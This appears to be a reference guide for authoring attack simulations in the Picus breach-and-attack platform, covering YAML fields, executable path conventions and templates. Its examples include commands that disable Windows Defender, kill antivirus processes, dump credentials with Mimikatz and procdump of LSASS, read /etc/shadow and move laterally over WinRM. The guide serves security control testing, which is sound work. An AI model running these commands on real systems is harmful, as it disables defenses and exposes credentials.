# Endpoint Module Reference

Applies to: `Endpoint Scenario`, `Linux Endpoint Scenario`, `macOS Endpoint Scenario`,
`Kubernetes Endpoint Scenario`

---

## Action-Level Fields (Endpoint Only)

| Field | Required | Type | Description |
|---|---|---|---|
| `play_processes` | **Yes** | List | Attack processes to execute. At least one required. |
| `rewind_processes` | No | List | Cleanup processes to reverse the attack. Same structure. |
| `is_privileged` | No | Boolean | Whether the action requires elevated privileges. |
| ~~`is_remote`~~ | — | Boolean | **UI-API only — do not author it.** Picus's `/api/v2/ui` action payload carries it (default `false`) and `fix_web_keywords.py` must resend it, but it appears in 0 of 31,356 predefined actions and 0 of 18 exported threats. Import accepts and ignores it. |
| ~~`needs_creds`~~ | — | Boolean | Same: UI-API only. A lateral-movement action gets its peer and credentials from the `%REMOTE*%` variables in `arguments`. |

---

## Process Fields

Each item in `play_processes` or `rewind_processes`:

| Field | Required | Type | Description |
|---|---|---|---|
| `path` | Windows only | String | The executable. **Form depends on the OS — see Process `path` convention below.** Windows: a bare exe name (`cmd.exe`). Linux/macOS/K8s: **omit it** and put the whole command in `arguments`. |
| `arguments` | No | String | Command-line arguments passed to the executable. |
| `timeout` | No | Integer | Timeout in seconds before the process is killed. |
| `delay` | No | Integer | Delay in seconds before execution starts. |
| `is_async` | No | Boolean | Run asynchronously (don't wait for process to finish). |
| `remote_files` | No | List | Binary files the process needs. See Remote Files. |
| `success_conditions` | No | List | How to determine if the process succeeded. |

---

## Process `path` convention — get this wrong and the action silently does nothing

Measured over **2,252 genuine Picus actions / 3,704 processes** — every predefined
Endpoint-family action in the on-prem library, read via
`GET /v1/threat-library/actions/{id}` -> `module_based_details.processes`:

| Module | processes | empty path (stored as `" "`) | bare exe name | `%ENV%\file.exe` | absolute path |
|---|---|---|---|---|---|
| `Endpoint Scenario` (Windows) | 2508 | — | **1902 (75.8%)** | **583 (23.2%)** | 23 (0.9%) |
| `Linux Endpoint Scenario` | 628 | **604 (96.2%)** | 2 | — | 22 (3.5%) |
| `macOS Endpoint Scenario` | 301 | **292 (97.0%)** | 1 | — | 8 (2.7%) |
| `Kubernetes Endpoint Scenario` | 267 | **251 (94.0%)** | 2 | — | 14 (5.2%) |

Windows has **two** house forms, not one: a bare name for anything on `PATH`, and an
environment-variable path for a file the action itself dropped. The 583 env-var paths break down
as `%TMP%` 560, `"%TMP%` 13, `%APPDATA%` 5, `%windir%` 2, `%public%` 1.

The API renders a stored empty path as a single space, which is why the Unix columns above read
`" "`. **In the YAML you author, omit the `path` key entirely** — that is what Picus's own
exported threats do. Counted in the two Unix examples bundled with this skill: the Kubernetes
C2 plan has 68 `- arguments:`-only processes vs 1 with a `path`; the macOS Realst campaign has 8
vs 3. Neither file contains a literal `path: ' '`. Writing `path: ' '` works too (the platform
normalises both), but omitting is the house form.

### Windows -> bare exe name

```yaml
play_processes:
  - path: reg.exe                      # NOT C:\Windows\System32\reg.exe
    arguments: add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

`arguments` is **not** shell-evaluated. Anything needing a pipe, `&`, `&&`, `>`, `%VAR%`
expansion or a quoted inner command must go through an interpreter:

```yaml
  - path: cmd.exe
    arguments: /c "%TMP%\Backstab.exe" -n MsMpEng.exe -k
  - path: powershell.exe
    arguments: -NoProfile -Command "Get-ADDomain; Get-ADGroupMember -Identity 'Domain Admins'"
```

A **dropped payload goes straight into `path`** as an environment-variable path, with its
`remote_files` nested inside the same process. This is Picus's dominant Windows form (575 of 2508
processes use a `%TMP%\...` path) — verbatim from the vendor's own TIDrone Threat Group Campaign
(threat 138):

```yaml
play_processes:
  - path: '%TMP%\VsGraphicsDesktopEngine.exe'      # the dropped exe IS the path
    remote_files:
      - file: files/VnNHcmFwaGljc0Rlc2t0b3BFbmdpbmVfX184ZDQzM2ZkNi1hMjE0LTQ1YzAtYjcwOS02MjliNTIwNGE1ZDAuZXhl
        path: '%TMP%\VsGraphicsDesktopEngine.exe'
        is_downloaded: true
      - file: files/VnNHcmFwaGljc1Byb3h5U3R1Yl9fXzQ2NzQ3MWI5LTUzODgtNDRhOC04ZGMzLWFhZTk3NGVhNmUyOC5kbGw=
        path: '%TMP%\VsGraphicsProxyStub.dll'       # side-loaded DLL, never executed directly
        is_downloaded: true
```

Note the `files/` entry name: **base64 of `<basename>___<uuid>.<ext>`**
(`VnNHcmFwaGljc0Rlc2t0b3BFbmdpbmVfX18...` decodes to
`VsGraphicsDesktopEngine___8d433fd6-a214-45c0-b709-629b5204a5d0.exe`). The `path:` beside it is
where the agent writes the file; that is the path you then reference.

Use `cmd.exe /c "%TMP%\tool.exe" ...` only when the invocation genuinely needs a shell — a pipe,
`&&`, a redirect, or an inner quoted command:

```yaml
  - path: cmd.exe
    arguments: /c "%TMP%\tool.exe" --flag > "%TMP%\out.txt"
```

Because `arguments` is not shell-evaluated, `%VAR%` **in `arguments` is still expanded** by the
agent before launch (1580 `%TMP%` occurrences across Windows `arguments`) — what you do not get is
shell *syntax*.

### Windows -> absolute path only for a binary that is not on `PATH`

All 23 absolute Windows paths in the library are binaries you *cannot* reach by name, or a drop
outside `%TMP%`:

| Absolute path used | n | why it has to be absolute |
|---|---|---|
| `C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe` | 3 | .NET SDK dir is not on `PATH` |
| `...\v4.0.30319\{InstallUtil,regasm,regsvcs,csc}.exe` | 4 | same |
| `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe` | 2 | app install dir |
| `C:\Program Files\Internet Explorer\iexplore.exe`, `...\Windows Media Player\Legal\wmpshare.exe`, `...\Windows Photo Viewer\ImagingDevices.exe` | 3 | app install dirs |
| `C:\Windows\System32\WinBioPlugIns\FaceFodUninstaller.exe`, `...\DeviceEnroller.exe` | 2 | subdir / rarely-pathed LOLBin |
| `C:\ProgramData\Apple\Update\sidebar.exe`, `C:\Users\Public\getasynckeystate.exe`, `c:\Windows\Temp\soy.exe`, `C:\kworking\agent.exe`, `C:\ProgramData\Apple\UserInstall.exe` | 6 | payload dropped outside `%TMP%` |
| `C:\Windows\System32\{mmc,cscript}.exe`, `C:\Windows\SysWOW64\cscript.exe` | 3 | the only three that *are* on `PATH` |

So: **never write an absolute path for something already on `PATH`** (`reg.exe`, `cmd.exe`,
`powershell.exe`, `schtasks.exe`, `whoami.exe`, ...). Only 3 of 2508 processes do, and the one
case this skill measured end-to-end — `C:\Windows\System32\reg.exe` on agent 3.0.2.0 — came back
`not tested` with `command = " "` and no output. Bare name on the same host, same action, same
minute: `completion_ratio 100` and `The operation completed successfully.`

### Linux / macOS / Kubernetes -> omit `path`, command in `arguments`

```yaml
play_processes:
  - arguments: bash -c 'cp /tmp/stager /dev/shm/stager; chmod +x /dev/shm/stager; /dev/shm/stager'
  - arguments: LFILE=/etc/shadow; awk '//' "$LFILE"
  - arguments: '"$WORKDIR"/implant'              # a dropped file, run from $WORKDIR
```

Unlike Windows, a dropped payload on Unix **may** be named directly in `path`
(`- path: /tmp/hack-browser-data` / `arguments: -b all`, from Picus's own Realst campaign), or
simply invoked from `arguments`. Both are used; `arguments` alone is the more common.

Here `arguments` **is** shell-evaluated, so `;`, `|`, `$(...)`, `&&` and env vars work directly.
Two Picus-injected variables are available in these modules (not Windows):

- **`"$WORKDIR"`** — the per-simulation working directory, expanded at execution time. Always quote it.
- **`$remotefile<digits>`** — a Picus-injected URL placeholder for downloader-style actions
  (`T1105`). The Windows spelling is `%remotefile-<digits>%`.

An absolute `/bin/<tool>` in `path` is used by Picus only for a single bare binary with no shell
syntax at all (`/bin/hostname`, `/bin/ps aux`, `/usr/bin/whoami`, `/bin/sh "$WORKDIR"/x.sh`).
Prefer omitting `path` — it always works and keeps one shape.

### `{predefined-*}` pseudo-processes — Windows only, 441 of 2508 processes (17.6%)

Picus has five built-in helper steps. You put the token in `path` and the operand in
`arguments`; there is no executable involved. **They appear only in `Endpoint Scenario`
(Windows)** — zero occurrences in the Linux, macOS and Kubernetes modules.

| `path` token | n | `arguments` | What it does |
|---|---|---|---|
| `{predefined-process-list}` | 332 | a process name, or `a.exe \|\| b.exe \|\| c.exe` | Watches for that process. Place it **before** the step that is supposed to spawn it. `\|\|` = any one of these names counts (used for the localised calculator: `calc.exe \|\| win32calc.exe \|\| calculator.exe \|\| calculatorapp`). Top values: `notepad.exe` 169, `winver.exe` 77, calculator 70, `mspaint.exe` 9. |
| `{predefined-file-search}` | 72 | a file path | Watches for that file appearing, e.g. `%TMP%\transacted_hollowing.txt`, `C:\Users\Public\sideloadedpicus.txt`. |
| `{predefined-process-sleep}` | 33 | seconds, as a **quoted string** (`"5"`) | Pacing between steps. Observed values 5, 8, 10, 20, 30, 60, 120. |
| `{predefined-process-kill}` | 2 | a process name | Cleanup — belongs in `rewind_processes`. |
| `{predefined-file-delete}` | 2 | a file path | Cleanup — belongs in `rewind_processes`. |

The canonical drop → wait → verify → clean shape, verbatim from the vendor's TIDrone campaign
(threat 138, action "Load a DLL File in RC.exe using DLL Side-Loading"):

```yaml
play_processes:
  - path: '%TMP%\VsGraphicsDesktopEngine.exe'
    remote_files:
      - file: files/<base64 of VsGraphicsDesktopEngine___<uuid>.exe>
        path: '%TMP%\VsGraphicsDesktopEngine.exe'
        is_downloaded: true
  - path: '{predefined-process-sleep}'
    arguments: "5"
  - path: '{predefined-process-list}'
    arguments: winver.exe
    success_conditions:
      - code: 2
        is_inverse: true          # grade on the watcher NOT returning "absent"
rewind_processes:
  - path: '{predefined-file-delete}'
    arguments: '%TMP%\VsGraphicsDesktopEngine.exe'
  - path: '{predefined-process-kill}'
    arguments: winver.exe
```

`code: 2` + `is_inverse: true` is the pairing Picus uses on every `{predefined-process-list}`
watcher in that threat (5/5).

### Picus-injected variables

Windows `arguments` and `path` (counts over the 2508 Windows processes):

| Variable | n | Meaning |
|---|---|---|
| `%TMP%` | 1580 | per-simulation temp dir; the standard drop location |
| `%APPDATA%` 115 · `%USERPROFILE%` 18 · `%LOCALAPPDATA%` 9 · `%PUBLIC%` 8 · `%WINDIR%` 10 · `%SYSTEMROOT%` 8 · `%USERNAME%` 31 | | ordinary Windows env vars, expanded by the agent |
| `%remotefile-<digits>%` | 94 | Picus-injected download URL (never in `path` — 0 of 2508) |
| `%REMOTEIP%` 37 · `%REMOTEHOSTNAME%` 24 · `%REMOTEDOMAIN%` 35 · `%REMOTEUSERNAME%` 35 · `%REMOTEPASSWORD%` 30 | | the **lateral-movement peer** and its credentials, filled in by the platform from the agent pair configured for the simulation. Only used by `category: Lateral Movement Techniques` actions. |

Linux / macOS / Kubernetes `arguments`: `"$WORKDIR"` (617) and `$remotefile<digits>` (41). Note
the spelling difference — `$remotefile11673` on Unix, `%remotefile-18470%` on Windows.

### Verified failure mode (why this matters)

Controlled A/B on the same action, same agent (`SimulationAgent04`, Windows agent **3.0.2.0**),
7 minutes apart, 2026-10-27:

| `path` written | `command` the platform reports back | process spawned | output |
|---|---|---|---|
| `C:\Windows\System32\reg.exe` | `" "` — **both fields came back empty** | none in Sysmon | none |
| `' '` (the Linux form) | `" cmd.exe /c reg add ..."` | none in Sysmon | none |
| `reg.exe` | `"reg.exe add ..."` | EID1 + EID13 | `The operation completed successfully.` |

The platform renders the command as `path + " " + arguments`, so **`command: " "` in a run
result means the agent received an empty `path` and empty `arguments`** — the signature of this
bug. The run still reports `status: COMPLETED`, but with `completion_ratio: 0` and
`prevention: "not tested"`.

Two traps that make this look like something else:

1. **`rewind_processes` with an absolute path still runs** (it is executed by
   `Picus.Simulation.AgentService.exe` as SYSTEM, a different path from play, which the Simulator
   runs as the execution user). So you see the cleanup happen and never the attack — which reads
   exactly like an EDR prevention.
2. Picus's own library does contain 18 absolute Windows paths (0.9%), so absolute is not
   categorically rejected everywhere — it may be agent-version or binary dependent. The
   mechanism is not fully established; the bare name is the house style and is known to work.

**Debug recipe:** `GET /v1/simulations/{simId}/run/{runId}/threats/{threatId}/actions/{actionId}`
and read `module_based_results.process_results[].command`. `" "` = this bug. Cross-check the
stored definition with `GET /v1/threat-library/threats/{id}/export` (plain YAML when the threat
carries no files; AES-encrypted zip when it does).

---

## Success Conditions

Each item in `success_conditions`:

| Field | Type | Description |
|---|---|---|
| `code` | Integer | Expected exit code (e.g., `0` for success). |
| `output` | String | Expected text substring in the process output. |
| `is_inverse` | Boolean | When `true`, the condition is negated — process succeeds when condition is NOT met. |

---

## Full Endpoint Action Template

```yaml
- name: action_one
  title: Execute Mimikatz Credential Dump
  description: Dumps credentials using Mimikatz sekurlsa module
  affected_os:
    - Windows
  is_atomic: true
  is_privileged: true
  ukc_phase: Credential Access
  category: Attack Scenario
  tactic: TA0006
  technique: T1003
  sub_technique: T1003.001
  malware_family: Mimikatz
  keyword_queries:
    - (("mimikatz" OR "sekurlsa" OR "lsadump"))
  result_condition:
    "true": unblocked
    "false": blocked
    condition:
      Right:
        Value: unblocked
      Left:
        Value: '%process-1%'
      Operator: eq
  play_processes:
    - path: cmd.exe
      arguments: /c "%TMP%\mimikatz.exe" "sekurlsa::logonpasswords" exit
      timeout: 60
      delay: 0
      is_async: false
      remote_files:                      # nested in the PROCESS, not the action
        - file: files/bWltaWthdHpfX18xZDZkNzQ5OS05MjczLTQwZmUtODJhNy1hN2FhMWIyZDQzMTQuZXhl
          path: '%TMP%\mimikatz.exe'       # ^ base64("mimikatz___<uuid>.exe")
          is_executable: true
          is_downloaded: true
      success_conditions:
        - code: 0
        - output: "sekurlsa::logonpasswords"
          is_inverse: false
  rewind_processes:
    - path: cmd.exe
      arguments: /c del "%TMP%\mimikatz.exe"
      timeout: 30
```

---

## Lateral Movement Action Template (Endpoint Scenario only)

`is_remote:` and `needs_creds:` are **UI-API fields, not authored YAML** — zero occurrences
across 31,356 predefined actions and 18 exported vendor threats, though Picus's own
`/api/v2/ui` payload carries them (see `references/web-keyword-fix.md`). Import accepts and
ignores them. The peer comes from the `%REMOTE*%` variables instead; the platform fills them
from the agent pair chosen for the simulation.

Shape taken from the real action 25450 *Execute the Wsman-Winrm Tool*:

```yaml
- name: Execute the Wsman-Winrm Tool
  description: In this action, an attacker is trying to execute the WSMan-WinRM tool to execute command on Remote Machine.
  is_atomic: true
  is_privileged: true
  ukc_phase: Execution                  # NOT "Lateral Movement" — see the stage/phase table
  category: Lateral Movement Techniques
  tactic: TA0008
  technique: T1021
  sub_technique: T1021.006
  affected_os:
    - Windows
  play_processes:
    - path: cmd.exe
      arguments: '/c ""%TMP%\SharpWSManWinRM.exe" %REMOTEHOSTNAME% ipconfig "%REMOTEDOMAIN%\%REMOTEUSERNAME%" "%REMOTEPASSWORD%""'
      remote_files:
        - file: files/<base64 of SharpWSManWinRM___<uuid>.exe>
          path: '%TMP%\SharpWSManWinRM.exe'
          is_downloaded: true
```

Of the 58 `Lateral Movement Techniques` actions, `ukc_phase` is `Execution` or `Discovery` far
more often than `Lateral Movement` — the category describes the *technique family*, the phase
describes what the step achieves. Do not emit `success_conditions: [{code: 0}]` here; see
[success-conditions.md](../success-conditions.md).

---

## Multi-Process Action Template

An action can have multiple play_processes executed in sequence:

```yaml
- name: multi_stage
  title: Download and Execute Payload
  is_atomic: false
  ukc_phase: Execution
  category: Attack Scenario
  play_processes:
    - path: cmd.exe
      arguments: /c copy files\stage1.exe "%TMP%\stage1.exe"
      timeout: 30
      remote_files:
        - file: files/stage1.exe
          path: '%TMP%\stage1.exe'
          is_executable: true
          is_downloaded: true
    - path: cmd.exe
      arguments: /c "%TMP%\stage1.exe" --silent
      timeout: 60
      delay: 5
      success_conditions:
        - code: 0
          is_inverse: false
  rewind_processes:
    - path: cmd.exe
      arguments: /c del "%TMP%\stage1.exe"
      timeout: 15
```

---

## Full Campaign Example — Endpoint Scenario

```yaml
campaign:
  name: APT29 Credential Harvesting Simulation
  module: Endpoint Scenario
  severity: High
  description: Simulates APT29 credential harvesting using LSASS dumping techniques.
  affected_os:
    - Windows
  threat_actor: APT29
  result_condition:
    "true": unblocked
    "false": blocked
    condition:
      Right:
        Value: unblocked
      Left:
        Value: '%objective-1%'
      Operator: eq
  objectives:
    - type: Credential Access
      result_condition:
        "true": unblocked
        "false": blocked
        condition:
          Terms:
            - Right:
                Value: unblocked
              Left:
                Value: '%action-1%'
              Operator: eq
          Operator: and
      actions:
        - name: dump_lsass
          title: Dump LSASS Process Memory
          description: Uses procdump to capture LSASS memory for offline credential extraction
          affected_os:
            - Windows
          is_atomic: true
          is_privileged: true
          ukc_phase: Credential Access
          category: Attack Scenario
          tactic: TA0006
          technique: T1003
          sub_technique: T1003.001
          keyword_queries:
            - (("procdump" OR "lsass.dmp" OR "T1003.001"))
          play_processes:
            - path: cmd.exe
              arguments: /c procdump.exe -accepteula -ma lsass C:\Temp\lsass.dmp
              timeout: 120
              remote_files:
                - file: files/procdump.exe
                  path: '%TMP%\procdump.exe'
                  is_executable: true
                  is_downloaded: true
              success_conditions:
                - code: 0
                - output: "Dump 1 complete"
          rewind_processes:
            - path: cmd.exe
              arguments: /c del C:\Temp\lsass.dmp & del C:\Temp\procdump.exe
              timeout: 30
```
